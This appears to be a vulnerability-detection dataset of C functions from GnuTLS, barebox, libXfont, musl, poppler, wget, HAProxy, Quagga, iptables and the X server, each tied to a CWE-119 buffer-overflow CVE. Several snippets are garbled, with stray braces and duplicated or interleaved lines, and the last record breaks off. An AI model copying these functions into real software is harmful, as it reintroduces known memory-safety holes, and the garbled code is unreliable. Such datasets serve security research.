{"idx": 157857, "project": "savannah", "commit_id": "190cef6eed37d0e73a73c1e205eb31d45ab60a3c", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=190cef6eed37d0e73a73c1e205eb31d45ab60a3c", "commit_message": "None", "target": 0, "func": "gnutls_session_get_data (gnutls_session_t session,\n                         void *session_data, size_t * session_data_size)\n{\n\n  gnutls_datum_t psession;\n  int ret;\n\n  if (session->internals.resumable == RESUME_FALSE)\n    return GNUTLS_E_INVALID_SESSION;\n\n  psession.data = session_data;\n\n  ret = _gnutls_session_pack (session, &psession);\n  if (ret < 0)\n    {\n       gnutls_assert ();\n       return ret;\n     }\n \n   if (psession.size > *session_data_size)\n     {\n       ret = GNUTLS_E_SHORT_MEMORY_BUFFER;\n       goto error;\n     }\n  *session_data_size = psession.size;\n \n   if (session_data != NULL)\n     memcpy (session_data, psession.data, psession.size);\n\n  ret = 0;\n\nerror:\n  _gnutls_free_datum (&psession);\n  return ret;\n}\n", "func_hash": 217937088037221829579003352102231694649, "file_name": "gnutls_session.c", "file_hash": 172090285683835050051624343283961906986, "cwe": ["CWE-119"], "cve": "CVE-2011-4128", "cve_desc": "Buffer overflow in the gnutls_session_get_data function in lib/gnutls_session.c in GnuTLS 2.12.x before 2.12.14 and 3.x before 3.0.7, when used on a client that performs nonstandard session resumption, allows remote TLS servers to cause a denial of service (application crash) via a large SessionTicket.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4128"}
{"idx": 157858, "project": "savannah", "commit_id": "e82ef4545e9e98cbcb032f55d7c750b81e3a0450", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=e82ef4545e9e98cbcb032f55d7c750b81e3a0450", "commit_message": "None", "target": 0, "func": "gnutls_session_get_data (gnutls_session_t session,\n                         void *session_data, size_t * session_data_size)\n{\n\n  gnutls_datum_t psession;\n  int ret;\n\n  if (session->internals.resumable == RESUME_FALSE)\n    return GNUTLS_E_INVALID_SESSION;\n\n  psession.data = session_data;\n\n  ret = _gnutls_session_pack (session, &psession);\n  if (ret < 0)\n    {\n      gnutls_assert ();\n      return ret;\n    }\n \n   if (psession.size > *session_data_size)\n     {\n      *session_data_size = psession.size;\n       ret = GNUTLS_E_SHORT_MEMORY_BUFFER;\n       goto error;\n     }\n\n  if (session_data != NULL)\n    memcpy (session_data, psession.data, psession.size);\n\n  ret = 0;\n\nerror:\n  _gnutls_free_datum (&psession);\n  return ret;\n}\n", "func_hash": 282098968981021847575763555214602715866, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-4128", "cve_desc": "Buffer overflow in the gnutls_session_get_data function in lib/gnutls_session.c in GnuTLS 2.12.x before 2.12.14 and 3.x before 3.0.7, when used on a client that performs nonstandard session resumption, allows remote TLS servers to cause a denial of service (application crash) via a large SessionTicket.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4128"}
{"idx": 157899, "project": "pengutronix", "commit_id": "574ce994016107ad8ab0f845a785f28d7eaa5208", "project_url": "https://git.pengutronix.de/cgit/barebox/commit/fs/nfs.c?h=next&id=574ce994016107ad8ab0f845a785f28d7eaa5208", "commit_url": "https://git.pengutronix.de/cgit/barebox/commit/fs/nfs.c?h=next&id=574ce994016107ad8ab0f845a785f28d7eaa5208", "commit_message": "None", "target": 0, "func": "static int nfs_readlink_req(struct nfs_priv *npriv, struct nfs_fh *fh,\n\t\t\t    char **target)\n{\n\tuint32_t data[1024];\n\tuint32_t *p;\n\tuint32_t len;\n\tstruct packet *nfs_packet;\n\n\t/*\n\t * struct READLINK3args {\n\t * \tnfs_fh3 symlink;\n\t * };\n\t *\n\t * struct READLINK3resok {\n\t * \tpost_op_attr symlink_attributes;\n\t * \tnfspath3 data;\n\t * };\n\t *\n\t * struct READLINK3resfail {\n\t * \tpost_op_attr symlink_attributes;\n\t * }\n\t *\n\t * union READLINK3res switch (nfsstat3 status) {\n\t * case NFS3_OK:\n\t * \tREADLINK3resok resok;\n\t * default:\n\t * \tREADLINK3resfail resfail;\n\t * };\n\t */\n\tp = &(data[0]);\n\tp = rpc_add_credentials(p);\n\n\tp = nfs_add_fh3(p, fh);\n\n\tlen = p - &(data[0]);\n\n\tnfs_packet = rpc_req(npriv, PROG_NFS, NFSPROC3_READLINK, data, len);\n\tif (IS_ERR(nfs_packet))\n\t\treturn PTR_ERR(nfs_packet);\n\n\tp = (void *)nfs_packet->data + sizeof(struct rpc_reply) + 4;\n\n \tp = nfs_read_post_op_attr(p, NULL);\n \n \tlen = ntoh32(net_read_uint32(p)); /* new path length */\n\n\tlen = max_t(unsigned int, len,\n\t\t    nfs_packet->len - sizeof(struct rpc_reply) - sizeof(uint32_t));\n\n \tp++;\n \n \t*target = xzalloc(len + 1);\n\treturn 0;\n}\n", "func_hash": 52376305515786293225734978443916270796, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2019-15938", "cve_desc": "Pengutronix barebox through 2019.08.1 has a remote buffer overflow in nfs_readlink_req in fs/nfs.c because a length field is directly used for a memcpy.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15938"}
{"idx": 157900, "project": "pengutronix", "commit_id": "84986ca024462058574432b5483f4bf9136c538d", "project_url": "https://git.pengutronix.de/cgit/barebox/commit/fs/nfs.c?h=next&id=574ce994016107ad8ab0f845a785f28d7eaa5208", "commit_url": "https://git.pengutronix.de/cgit/barebox/commit/net/nfs.c?h=next&id=84986ca024462058574432b5483f4bf9136c538d", "commit_message": "None", "target": 0, "func": "static int nfs_readlink_reply(unsigned char *pkt, unsigned len)\n {\n \tuint32_t *data;\n \tchar *path;\n\tunsigned int rlen;\n \tint ret;\n \n \tret = rpc_check_reply(pkt, 1);\n\tif (ret)\n\t\treturn ret;\n\n\tdata = (uint32_t *)(pkt + sizeof(struct rpc_reply));\n\n\tdata++;\n \n \trlen = ntohl(net_read_uint32(data)); /* new path length */\n \n\trlen = max_t(unsigned int, rlen,\n\t\t     len - sizeof(struct rpc_reply) - sizeof(uint32_t));\n\n \tdata++;\n \tpath = (char *)data;\n\t} else {\n\t\tmemcpy(nfs_path, path, rlen);\n\t\tnfs_path[rlen] = 0;\n\t}\n", "func_hash": 206056256559243150120680816426898705118, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2019-15937", "cve_desc": "Pengutronix barebox through 2019.08.1 has a remote buffer overflow in nfs_readlink_reply in net/nfs.c because a length field is directly used for a memcpy.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15937"}
{"idx": 157919, "project": "libxfont", "commit_id": "d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_message": "None", "target": 0, "func": "BufCompressedFill (BufFilePtr f)\n{\n    CompressedFile  *file;\n    register char_type *stackp, *de_stack;\n    register char_type finchar;\n    register code_int code, oldcode, incode;\n    BufChar\t    *buf, *bufend;\n\n    file = (CompressedFile *) f->private;\n\n    buf = f->buffer;\n    bufend = buf + BUFFILESIZE;\n    stackp = file->stackp;\n    de_stack = file->de_stack;\n    finchar = file->finchar;\n    oldcode = file->oldcode;\n    while (buf < bufend) {\n\twhile (stackp > de_stack && buf < bufend)\n\t    *buf++ = *--stackp;\n\n\tif (buf == bufend)\n\t    break;\n\n\tif (oldcode == -1)\n\t    break;\n\n\tcode = getcode (file);\n\tif (code == -1)\n\t    break;\n    \n    \tif ( (code == CLEAR) && file->block_compress ) {\n\t    for ( code = 255; code >= 0; code-- )\n\t    \tfile->tab_prefix[code] = 0;\n\t    file->clear_flg = 1;\n\t    file->free_ent = FIRST - 1;\n\t    if ( (code = getcode (file)) == -1 )\t/* O, untimely death! */\n\t    \tbreak;\n    \t}\n    \tincode = code;\n    \t/*\n     \t * Special case for KwKwK string.\n     \t */\n    \tif ( code >= file->free_ent ) {\n\t    *stackp++ = finchar;\n\t    code = oldcode;\n    \t}\n    \n    \t/*\n     \t * Generate output characters in reverse order\n      \t */\n     \twhile ( code >= 256 )\n     \t{\n\t    if (stackp - de_stack >= STACK_SIZE - 1)\n\t\treturn BUFFILEEOF;\n \t    *stackp++ = file->tab_suffix[code];\n \t    code = file->tab_prefix[code];\n     \t}\n    \n    \t/*\n     \t * Generate the new entry.\n     \t */\n    \tif ( (code=file->free_ent) < file->maxmaxcode ) {\n\t    file->tab_prefix[code] = (unsigned short)oldcode;\n\t    file->tab_suffix[code] = finchar;\n\t    file->free_ent = code+1;\n    \t} \n\t/*\n\t * Remember previous code.\n\t */\n\toldcode = incode;\n    }\n    file->oldcode = oldcode;\n    file->stackp = stackp;\n    file->finchar = finchar;\n    if (buf == f->buffer) {\n\tf->left = 0;\n\treturn BUFFILEEOF;\n    }\n    f->bufp = f->buffer + 1;\n    f->left = (buf - f->buffer) - 1;\n    return f->buffer[0];\n}\n", "func_hash": 176288859918527814344787198280161772156, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-2895", "cve_desc": "The LZW decompressor in (1) the BufCompressedFill function in fontfile/decompress.c in X.Org libXfont before 1.4.4 and (2) compress/compress.c in 4.3BSD, as used in zopen.c in OpenBSD before 3.8, FreeBSD, NetBSD 4.0.x and 5.0.x before 5.0.3 and 5.1.x before 5.1.1, FreeType 2.1.9, and other products, does not properly handle code words that are absent from the decompression table when encountered, which allows context-dependent attackers to trigger an infinite loop or a heap-based buffer overflow, and possibly execute arbitrary code, via a crafted compressed stream, a related issue to CVE-2006-1168 and CVE-2011-2896.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2895"}
{"idx": 157920, "project": "musl", "commit_id": "45ca5d3fcb6f874bf5ba55d0e9651cef68515395", "project_url": "https://git.musl-libc.org/cgit/musl/commit/?id=45ca5d3fcb6f874bf5ba55d0e9651cef68515395", "commit_url": "https://git.musl-libc.org/cgit/musl/commit/?id=45ca5d3fcb6f874bf5ba55d0e9651cef68515395", "commit_message": "None", "target": 0, "func": "static int dns_parse_callback(void *c, int rr, const void *data, int len, const void *packet)\n {\n \tchar tmp[256];\n \tstruct dpc_ctx *ctx = c;\n\tif (ctx->cnt >= MAXADDRS) return -1;\n \tswitch (rr) {\n \tcase RR_A:\n \t\tif (len != 4) return -1;\n\t\tctx->addrs[ctx->cnt].scopeid = 0;\n\t\tmemcpy(ctx->addrs[ctx->cnt++].addr, data, 4);\n\t\tbreak;\n\tcase RR_AAAA:\n\t\tif (len != 16) return -1;\n\t\tctx->addrs[ctx->cnt].family = AF_INET6;\n\t\tctx->addrs[ctx->cnt].scopeid = 0;\n\t\tmemcpy(ctx->addrs[ctx->cnt++].addr, data, 16);\n\t\tbreak;\n\tcase RR_CNAME:\n\t\tif (__dn_expand(packet, (const unsigned char *)packet + 512,\n\t\t    data, tmp, sizeof tmp) > 0 && is_valid_hostname(tmp))\n\t\t\tstrcpy(ctx->canon, tmp);\n\t\tbreak;\n\t}\n\treturn 0;\n}\n", "func_hash": 60029525500602919860744776503907800398, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-15650", "cve_desc": "musl libc before 1.1.17 has a buffer overflow via crafted DNS replies because dns_parse_callback in network/lookup_name.c does not restrict the number of addresses, and thus an attacker can provide an unexpected number by sending A records in a reply to an AAAA query.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-15650"}
{"idx": 157922, "project": "poppler", "commit_id": "b8682d868ddf7f741e93b791588af0932893f95c", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/utils/pdfseparate.cc?id=b8682d868ddf7f741e93b", "commit_message": "pdfseparate: improve the path building\n\nMake use of snprintf to limit the output to the pathName buffer;\nwhile I'm there, expand its size to 4096 (might help longer paths),\nalthough a better fix would be dynamically allocate its length\n(and/or using GooString, maybe).", "target": 0, "func": " bool extractPages (const char *srcFileName, const char *destFileName) {\n  char pathName[4096];\n   GooString *gfileName = new GooString (srcFileName);\n   PDFDoc *doc = new PDFDoc (gfileName, NULL, NULL, NULL);\n \n  if (!doc->isOk()) {\n    error(errSyntaxError, -1, \"Could not extract page(s) from damaged file ('{0:s}')\", srcFileName);\n    return false;\n  }\n\n  if (firstPage == 0 && lastPage == 0) {\n    firstPage = 1;\n    lastPage = doc->getNumPages();\n  }\n  if (lastPage == 0)\n    lastPage = doc->getNumPages();\n  if (firstPage == 0)\n    firstPage = 1;\n  if (firstPage != lastPage && strstr(destFileName, \"%d\") == NULL) {\n    error(errSyntaxError, -1, \"'{0:s}' must contain '%%d' if more than one page should be extracted\", destFileName);\n     return false;\n   }\n   for (int pageNo = firstPage; pageNo <= lastPage; pageNo++) {\n    snprintf (pathName, sizeof (pathName) - 1, destFileName, pageNo);\n     GooString *gpageName = new GooString (pathName);\n     int errCode = doc->savePageAs(gpageName, pageNo);\n     if ( errCode != errNone) {\n      delete gpageName;\n      delete gfileName;\n      return false;\n    }\n    delete gpageName;\n  }\n  delete gfileName;\n  return true;\n}\n", "func_hash": 151037751520527895735005785354898270248, "file_name": "pdfseparate.cc", "file_hash": 242088384603448305863907034385681213666, "cwe": ["CWE-119"], "cve": "CVE-2013-4473", "cve_desc": "Stack-based buffer overflow in the extractPages function in utils/pdfseparate.cc in poppler before 0.24.2 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a source filename.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4473"}
{"idx": 157954, "project": "savannah", "commit_id": "ba6b44f6745b14dce414761a8e4b35d31b176bba", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/wget.git/commit/?id=ba6b44f6745b14dce414761a8e4b35d31b176bba", "commit_message": "None", "target": 0, "func": "fd_read_body (const char *downloaded_filename, int fd, FILE *out, wgint toread, wgint startpos,\n\n              wgint *qtyread, wgint *qtywritten, double *elapsed, int flags,\n              FILE *out2)\n{\n  int ret = 0;\n#undef max\n#define max(a,b) ((a) > (b) ? (a) : (b))\n  int dlbufsize = max (BUFSIZ, 8 * 1024);\n  char *dlbuf = xmalloc (dlbufsize);\n\n  struct ptimer *timer = NULL;\n  double last_successful_read_tm = 0;\n\n  /* The progress gauge, set according to the user preferences. */\n  void *progress = NULL;\n\n  /* Non-zero if the progress gauge is interactive, i.e. if it can\n     continually update the display.  When true, smaller timeout\n     values are used so that the gauge can update the display when\n     data arrives slowly. */\n  bool progress_interactive = false;\n\n  bool exact = !!(flags & rb_read_exactly);\n\n  /* Used only by HTTP/HTTPS chunked transfer encoding.  */\n  bool chunked = flags & rb_chunked_transfer_encoding;\n  wgint skip = 0;\n\n  /* How much data we've read/written.  */\n  wgint sum_read = 0;\n  wgint sum_written = 0;\n  wgint remaining_chunk_size = 0;\n\n#ifdef HAVE_LIBZ\n  /* try to minimize the number of calls to inflate() and write_data() per\n     call to fd_read() */\n  unsigned int gzbufsize = dlbufsize * 4;\n  char *gzbuf = NULL;\n  z_stream gzstream;\n\n  if (flags & rb_compressed_gzip)\n    {\n      gzbuf = xmalloc (gzbufsize);\n      if (gzbuf != NULL)\n        {\n          gzstream.zalloc = zalloc;\n          gzstream.zfree = zfree;\n          gzstream.opaque = Z_NULL;\n          gzstream.next_in = Z_NULL;\n          gzstream.avail_in = 0;\n\n          #define GZIP_DETECT 32 /* gzip format detection */\n          #define GZIP_WINDOW 15 /* logarithmic window size (default: 15) */\n          ret = inflateInit2 (&gzstream, GZIP_DETECT | GZIP_WINDOW);\n          if (ret != Z_OK)\n            {\n              xfree (gzbuf);\n              errno = (ret == Z_MEM_ERROR) ? ENOMEM : EINVAL;\n              ret = -1;\n              goto out;\n            }\n        }\n      else\n        {\n          errno = ENOMEM;\n          ret = -1;\n          goto out;\n        }\n    }\n#endif\n\n  if (flags & rb_skip_startpos)\n    skip = startpos;\n\n  if (opt.show_progress)\n    {\n      const char *filename_progress;\n      /* If we're skipping STARTPOS bytes, pass 0 as the INITIAL\n         argument to progress_create because the indicator doesn't\n         (yet) know about \"skipping\" data.  */\n      wgint start = skip ? 0 : startpos;\n      if (opt.dir_prefix)\n        filename_progress = downloaded_filename + strlen (opt.dir_prefix) + 1;\n      else\n        filename_progress = downloaded_filename;\n      progress = progress_create (filename_progress, start, start + toread);\n      progress_interactive = progress_interactive_p (progress);\n    }\n\n  if (opt.limit_rate)\n    limit_bandwidth_reset ();\n\n  /* A timer is needed for tracking progress, for throttling, and for\n     tracking elapsed time.  If either of these are requested, start\n     the timer.  */\n  if (progress || opt.limit_rate || elapsed)\n    {\n      timer = ptimer_new ();\n      last_successful_read_tm = 0;\n    }\n\n  /* Use a smaller buffer for low requested bandwidths.  For example,\n     with --limit-rate=2k, it doesn't make sense to slurp in 16K of\n     data and then sleep for 8s.  With buffer size equal to the limit,\n     we never have to sleep for more than one second.  */\n  if (opt.limit_rate && opt.limit_rate < dlbufsize)\n    dlbufsize = opt.limit_rate;\n\n  /* Read from FD while there is data to read.  Normally toread==0\n     means that it is unknown how much data is to arrive.  However, if\n     EXACT is set, then toread==0 means what it says: that no data\n     should be read.  */\n  while (!exact || (sum_read < toread))\n    {\n      int rdsize;\n      double tmout = opt.read_timeout;\n\n      if (chunked)\n        {\n          if (remaining_chunk_size == 0)\n            {\n              char *line = fd_read_line (fd);\n              char *endl;\n              if (line == NULL)\n                {\n                  ret = -1;\n                  break;\n                }\n              else if (out2 != NULL)\n                fwrite (line, 1, strlen (line), out2);\n\n               remaining_chunk_size = strtol (line, &endl, 16);\n               xfree (line);\n \n              if (remaining_chunk_size < 0)\n                {\n                  ret = -1;\n                  break;\n                }\n\n               if (remaining_chunk_size == 0)\n                 {\n                   ret = 0;\n                        fwrite (line, 1, strlen (line), out2);\n                      xfree (line);\n                    }\n                  break;\n                }\n            }\n\n          rdsize = MIN (remaining_chunk_size, dlbufsize);\n        }\n      else\n        rdsize = exact ? MIN (toread - sum_read, dlbufsize) : dlbufsize;\n\n      if (progress_interactive)\n        {\n          /* For interactive progress gauges, always specify a ~1s\n             timeout, so that the gauge can be updated regularly even\n             when the data arrives very slowly or stalls.  */\n          tmout = 0.95;\n          if (opt.read_timeout)\n            {\n              double waittm;\n              waittm = ptimer_read (timer) - last_successful_read_tm;\n              if (waittm + tmout > opt.read_timeout)\n                {\n                  /* Don't let total idle time exceed read timeout. */\n                  tmout = opt.read_timeout - waittm;\n                  if (tmout < 0)\n                    {\n                      /* We've already exceeded the timeout. */\n                      ret = -1, errno = ETIMEDOUT;\n                      break;\n                    }\n                }\n            }\n        }\n      ret = fd_read (fd, dlbuf, rdsize, tmout);\n\n      if (progress_interactive && ret < 0 && errno == ETIMEDOUT)\n        ret = 0;                /* interactive timeout, handled above */\n      else if (ret <= 0)\n        break;                  /* EOF or read error */\n\n      if (progress || opt.limit_rate || elapsed)\n        {\n          ptimer_measure (timer);\n          if (ret > 0)\n            last_successful_read_tm = ptimer_read (timer);\n        }\n\n      if (ret > 0)\n        {\n          int write_res;\n\n          sum_read += ret;\n\n#ifdef HAVE_LIBZ\n          if (gzbuf != NULL)\n            {\n              int err;\n              int towrite;\n              gzstream.avail_in = ret;\n              gzstream.next_in = (unsigned char *) dlbuf;\n\n              do\n                {\n                  gzstream.avail_out = gzbufsize;\n                  gzstream.next_out = (unsigned char *) gzbuf;\n\n                  err = inflate (&gzstream, Z_NO_FLUSH);\n\n                  switch (err)\n                    {\n                    case Z_MEM_ERROR:\n                      errno = ENOMEM;\n                      ret = -1;\n                      goto out;\n                    case Z_NEED_DICT:\n                    case Z_DATA_ERROR:\n                      errno = EINVAL;\n                      ret = -1;\n                      goto out;\n                    case Z_STREAM_END:\n                      if (exact && sum_read != toread)\n                        {\n                          DEBUGP((\"zlib stream ended unexpectedly after \"\n                                  \"%ld/%ld bytes\\n\", sum_read, toread));\n                        }\n                    }\n\n                  towrite = gzbufsize - gzstream.avail_out;\n                  write_res = write_data (out, out2, gzbuf, towrite, &skip,\n                                          &sum_written);\n                  if (write_res < 0)\n                    {\n                      ret = (write_res == -3) ? -3 : -2;\n                      goto out;\n                    }\n                }\n              while (gzstream.avail_out == 0);\n            }\n          else\n#endif\n            {\n              write_res = write_data (out, out2, dlbuf, ret, &skip,\n                                      &sum_written);\n              if (write_res < 0)\n                {\n                  ret = (write_res == -3) ? -3 : -2;\n                  goto out;\n                }\n            }\n\n          if (chunked)\n            {\n              remaining_chunk_size -= ret;\n              if (remaining_chunk_size == 0)\n                {\n                  char *line = fd_read_line (fd);\n                  if (line == NULL)\n                    {\n                      ret = -1;\n                      break;\n                    }\n                  else\n                    {\n                      if (out2 != NULL)\n                        fwrite (line, 1, strlen (line), out2);\n                      xfree (line);\n                    }\n                }\n            }\n        }\n\n      if (opt.limit_rate)\n        limit_bandwidth (ret, timer);\n\n      if (progress)\n        progress_update (progress, ret, ptimer_read (timer));\n#ifdef WINDOWS\n      if (toread > 0 && opt.show_progress)\n        ws_percenttitle (100.0 *\n                         (startpos + sum_read) / (startpos + toread));\n#endif\n    }\n", "func_hash": 220093956480677323605982437392462496483, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-13090", "cve_desc": "The retr.c:fd_read_body() function is called when processing OK responses. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk's length, but doesn't check that the chunk length is a non-negative number. The code then tries to read the chunk in pieces of 8192 bytes by using the MIN() macro, but ends up passing the negative chunk length to retr.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument. The attacker can corrupt malloc metadata after the allocated buffer.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-13090"}
{"idx": 157964, "project": "haproxy", "commit_id": "7ec765568883b2d4e5a2796adbeb492a22ec9bd4", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "https://git.haproxy.org/?p=haproxy-1.5.git;a=commit;h=7ec765568883b2d4e5a2796adbeb492a22ec9bd4", "commit_message": "None", "target": 0, "func": " void buffer_slow_realign(struct buffer *buf)\n {\n       int block1 = buf->o;\n       int block2 = 0;\n\n       /* process output data in two steps to cover wrapping */\n       if (block1 > buf->p - buf->data) {\n               block2 = buf->p - buf->data;\n               block1 -= block2;\n       }\n       memcpy(swap_buffer + buf->size - buf->o, bo_ptr(buf), block1);\n       memcpy(swap_buffer + buf->size - block2, buf->data, block2);\n\n       /* process input data in two steps to cover wrapping */\n       block1 = buf->i;\n       block2 = 0;\n\n       if (block1 > buf->data + buf->size - buf->p) {\n               block1 = buf->data + buf->size - buf->p;\n               block2 = buf->i - block1;\n        }\n       memcpy(swap_buffer, bi_ptr(buf), block1);\n       memcpy(swap_buffer + block1, buf->data, block2);\n\n       /* reinject changes into the buffer */\n       memcpy(buf->data, swap_buffer, buf->i);\n       memcpy(buf->data + buf->size - buf->o, swap_buffer + buf->size - buf->o, buf->o);\n \n        buf->p = buf->data;\n }\n", "func_hash": 93118898612400237957558909236733687601, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2015-3281", "cve_desc": "The buffer_slow_realign function in HAProxy 1.5.x before 1.5.14 and 1.6-dev does not properly realign a buffer that is used for pending outgoing data, which allows remote attackers to obtain sensitive information (uninitialized memory contents of previous requests) via a crafted request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3281"}
{"idx": 157965, "project": "savannah", "commit_id": "3f872fe60463a931c5c766dbf8c36870c0023e88", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=quagga.git;a=commitdiff;h=3f872fe60463a931c5c766dbf8c36870c0023e88", "commit_message": "None", "target": 0, "func": "new_msg_register_event (u_int32_t seqnum, struct lsa_filter_type *filter)\n{\n  u_char buf[OSPF_API_MAX_MSG_SIZE];\n  struct msg_register_event *emsg;\n  int len;\n\n  emsg = (struct msg_register_event *) buf;\n  len = sizeof (struct msg_register_event) +\n    filter->num_areas * sizeof (struct in_addr);\n   emsg->filter.typemask = htons (filter->typemask);\n   emsg->filter.origin = filter->origin;\n   emsg->filter.num_areas = filter->num_areas;\n  if (len > sizeof (buf))\n    len = sizeof(buf);\n  /* API broken - missing memcpy to fill data */\n   return msg_new (MSG_REGISTER_EVENT, emsg, seqnum, len);\n }\n", "func_hash": 145214918048062551547513527429211682293, "file_name": "ospf_api.c", "file_hash": 14936573712231031653620730937465117872, "cwe": ["CWE-119"], "cve": "CVE-2013-2236", "cve_desc": "Stack-based buffer overflow in the new_msg_lsa_change_notify function in the OSPFD API (ospf_api.c) in Quagga before 0.99.22.2, when --enable-opaque-lsa and the -a command line option are used, allows remote attackers to cause a denial of service (crash) via a large LSA.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2236"}
{"idx": 157985, "project": "netfilter", "commit_id": "2ae1099a42e6a0f06de305ca13a842ac83d4683e", "project_url": "https://git.netfilter.org/conntrack-tools", "commit_url": "https://git.netfilter.org/iptables/commit/iptables/xshared.c?id=2ae1099a42e6a0f06de305ca13a842ac83d4683e", "commit_message": "None", "target": 0, "func": " void add_param_to_argv(char *parsestart, int line)\n {\n\tint quote_open = 0, escaped = 0;\n\tstruct xt_param_buf param = {};\n\tchar *curchar;\n \n \t/* After fighting with strtok enough, here's now\n \t * a 'real' parser. According to Rusty I'm now no\n\t\t\t} else {\n\t\t\t\tparam_buffer[param_len++] = *curchar;\n \tfor (curchar = parsestart; *curchar; curchar++) {\n \t\tif (quote_open) {\n \t\t\tif (escaped) {\n\t\t\t\tadd_param(&param, curchar);\n \t\t\t\tescaped = 0;\n \t\t\t\tcontinue;\n \t\t\t} else if (*curchar == '\\\\') {\n\t\t}\n\n\t\tswitch (*curchar) {\n \t\t\t\tquote_open = 0;\n \t\t\t\t*curchar = '\"';\n \t\t\t} else {\n\t\t\t\tadd_param(&param, curchar);\n \t\t\t\tcontinue;\n \t\t\t}\n \t\t} else {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* regular character, copy to buffer */\n\t\t\tparam_buffer[param_len++] = *curchar;\n\n\t\t\tif (param_len >= sizeof(param_buffer))\n\t\t\t\txtables_error(PARAMETER_PROBLEM,\n \t\tcase ' ':\n \t\tcase '\\t':\n \t\tcase '\\n':\n\t\t\tif (!param.len) {\n \t\t\t\t/* two spaces? */\n \t\t\t\tcontinue;\n \t\t\t}\n \t\t\tbreak;\n \t\tdefault:\n \t\t\t/* regular character, copy to buffer */\n\t\t\tadd_param(&param, curchar);\n \t\t\tcontinue;\n \t\t}\n \n\t\tparam.buffer[param.len] = '\\0';\n \n \t\t/* check if table name specified */\n\t\tif ((param.buffer[0] == '-' &&\n\t\t     param.buffer[1] != '-' &&\n\t\t     strchr(param.buffer, 't')) ||\n\t\t    (!strncmp(param.buffer, \"--t\", 3) &&\n\t\t     !strncmp(param.buffer, \"--table\", strlen(param.buffer)))) {\n \t\t\txtables_error(PARAMETER_PROBLEM,\n \t\t\t\t      \"The -t option (seen in line %u) cannot be used in %s.\\n\",\n \t\t\t\t      line, xt_params->program_name);\n \t\t}\n \n\t\tadd_argv(param.buffer, 0);\n\t\tparam.len = 0;\n \t}\n", "func_hash": 82639535107168519393189431221613615364, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2019-11360", "cve_desc": "A buffer overflow in iptables-restore in netfilter iptables 1.8.2 allows an attacker to (at least) crash the program or potentially gain code execution via a specially crafted iptables-save file. This is related to add_param_to_argv in xshared.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11360"}
{"idx": 157990, "project": "xserver", "commit_id": "215f894965df5fb0bb45b107d84524e700d2073c", "project_url": "http://gitweb.freedesktop.org/?p=xorg/xserver", "commit_url": "https://cgit.freedesktop.org/xorg/xserver/commit/?id=215f894965df5fb0bb45b107d84524e700d2073c", "commit_message": "dix: Disallow GenericEvent in SendEvent request.\n\nThe SendEvent request holds xEvent which is exactly 32 bytes long, no more,\nno less. Both ProcSendEvent and SProcSendEvent verify that the received data\nexactly match the request size. However nothing stops the client from passing\nin event with xEvent::type = GenericEvent and any value of\nxGenericEvent::length.\n\nIn the case of ProcSendEvent, the event will be eventually passed to\nWriteEventsToClient which will see that it is Generic event and copy the\narbitrary length from the receive buffer (and possibly past it) and send it to\nthe other client. This allows clients to copy unitialized heap memory out of X\nserver or to crash it.\n\nIn case of SProcSendEvent, it will attempt to swap the incoming event by\ncalling a swapping function from the EventSwapVector array. The swapped event\nis written to target buffer, which in this case is local xEvent variable. The\nxEvent variable is 32 bytes long, but the swapping functions for GenericEvents\nexpect that the target buffer has size matching the size of the source\nGenericEvent. This allows clients to cause stack buffer overflows.\n\nSigned-off-by: Michal Srb <msrb@suse.com>\nReviewed-by: Peter Hutterer <peter.hutterer@who-t.net>\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>", "target": 0, "func": "ProcSendEvent(ClientPtr client)\n{\n    WindowPtr pWin;\n    WindowPtr effectiveFocus = NullWindow;      /* only set if dest==InputFocus */\n    DeviceIntPtr dev = PickPointer(client);\n    DeviceIntPtr keybd = GetMaster(dev, MASTER_KEYBOARD);\n    SpritePtr pSprite = dev->spriteInfo->sprite;\n\n    REQUEST(xSendEventReq);\n\n    REQUEST_SIZE_MATCH(xSendEventReq);\n\n    